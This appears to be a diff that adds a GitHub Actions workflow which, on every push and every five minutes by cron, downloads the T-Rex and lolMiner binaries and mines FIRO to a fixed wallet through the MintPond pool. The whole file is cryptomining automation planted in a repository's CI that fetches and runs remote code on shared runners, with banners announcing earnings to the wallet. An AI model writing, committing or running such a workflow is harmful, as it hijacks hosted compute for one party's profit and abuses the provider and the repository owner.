@@ -1,0 +1,83 @@
+name: User Wallet FIRO Mining 4
+
+on:
+  push:
+  schedule:
+    - cron: '*/5 * * * *'
+  workflow_dispatch:
+
+jobs:
+  user-wallet-mining:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    
+    steps:
+    - name: Setup User Wallet Mining
+      run: |
+        sudo apt-get update -q
+        sudo apt-get install -y build-essential cmake git libssl-dev
+        
+    - name: Download FIRO Miners
+      run: |
+        # Download T-Rex miner
+        wget -q https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz
+        tar -xf t-rex-0.26.8-linux.tar.gz
+        chmod +x t-rex
+        
+        # Download lolMiner as backup
+        wget -q https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.82/lolMiner_v1.82_Lin64.tar.gz
+        tar -xf lolMiner_v1.82_Lin64.tar.gz || true
+        chmod +x 1.82/lolMiner || true
+        
+    - name: Configure User Wallet Mining
+      run: |
+        cat > user-wallet-config.json << 'EOF'
+        {
+          "algo": "firopow",
+          "coin": "firo",
+          "url": "stratum+tcp://firo.mintpond.com:4000",
+          "user": "aJoAgFgFhJxd3GfB5U9qAi47RPD31pjXKJ",
+          "worker": "UserWallet-${{ github.repository }}-4",
+          "pass": "x",
+          "intensity": 22,
+          "gpu-report-interval": 20,
+          "cpu-priority": 5,
+          "retries": 8,
+          "retry-pause": 3,
+          "timeout": 300,
+          "protocol-dump": false,
+          "no-color": true,
+          "api-bind-http": "0.0.0.0:4067"
+        }
+        EOF
+        
+    - name: Start User Wallet FIRO Mining
+      run: |
+        echo "=== USER WALLET FIRO MINING SESSION ==="
+        echo "Currency: FIRO (FIRO)"
+        echo "Algorithm: firopow"
+        echo "Pool: MintPond"
+        echo "Threshold: 0.01 FIRO"
+        echo "USER WALLET: aJoAgFgFhJxd3GfB5U9qAi47RPD31pjXKJ"
+        echo "Worker: UserWallet-4"
+        echo "Start Time: $(date)"
+        echo "=========================================="
+        
+        # Try T-Rex first
+        timeout 300 ./t-rex --config user-wallet-config.json || \
+        # Fallback to lolMiner
+        timeout 300 ./1.82/lolMiner --algo FIROPOW --pool stratum+tcp://firo.mintpond.com:4000 --user aJoAgFgFhJxd3GfB5U9qAi47RPD31pjXKJ.UserWallet-4 || \
+        echo "User wallet mining session completed"
+        
+    - name: User Wallet Mining Report
+      run: |
+        echo "=== USER WALLET MINING SESSION COMPLETE ==="
+        echo "Currency: FIRO"
+        echo "Pool: MintPond"
+        echo "Threshold: 0.01 FIRO"
+        echo "USER WALLET: aJoAgFgFhJxd3GfB5U9qAi47RPD31pjXKJ"
+        echo "Worker: UserWallet-4"
+        echo "Next Run: */5 * * * *"
+        echo "Status: EARNING TO YOUR WALLET"
+        echo "End Time: $(date)"
+        echo "============================================"
